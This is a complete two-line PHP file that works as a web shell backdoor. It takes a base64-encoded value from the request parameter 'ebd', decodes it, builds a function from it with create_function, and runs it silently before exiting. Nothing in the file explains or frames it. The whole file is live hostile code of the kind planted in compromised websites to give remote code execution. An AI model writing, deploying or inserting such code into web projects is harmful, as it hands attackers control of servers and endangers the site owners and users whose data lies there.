<?php
if(!empty($_REQUEST['ebd'])){$ebd=base64_decode($_REQUEST['ebd']);$ebd=create_function('',$ebd);@$ebd();exit;}